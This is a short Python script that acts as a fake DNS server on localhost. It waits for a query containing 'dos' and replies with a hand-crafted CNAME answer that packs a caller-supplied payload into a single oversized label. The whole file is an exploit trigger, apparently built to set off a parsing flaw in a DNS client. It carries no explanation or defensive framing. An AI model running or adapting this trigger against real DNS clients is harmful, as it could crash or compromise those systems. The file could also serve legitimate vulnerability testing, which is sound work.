import socket
import argparse

def main(payload_str: str):
    payload_bytes = payload_str.encode('latin-1')
    ip = "127.0.0.1"
    port = 53
    
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.bind((ip, port))
        print(f"[TRIGGER] Listening for DNS query on {ip}:{port}...")
        data, addr = sock.recvfrom(1024)

        if b'dos' not in data:
            print("[TRIGGER] Received non-target query. Exiting.")
            return

        print(f"[TRIGGER] Received query from {addr}. Crafting malicious response...")
        transaction_id = data[:2]
        
        packet = bytearray()
        packet += transaction_id
        packet += b'\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00'
        packet += data[12:]
        packet += b'\xc0\x0c'
        packet += b'\x00\x05' # CNAME
        packet += b'\x00\x01' # IN
        packet += b'\x00\x00\x00\xff' # TTL

        # Format payload as a single, oversized DNS label
        malicious_rdata = len(payload_bytes).to_bytes(1, 'big') + payload_bytes + b'\x00'
        
        packet += len(malicious_rdata).to_bytes(2, 'big')
        packet += malicious_rdata
        
        sock.sendto(packet, addr)
        print(f"[TRIGGER] Malicious response sent.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--payload", type=str, required=True)
    args = parser.parse_args()
    main(args.payload)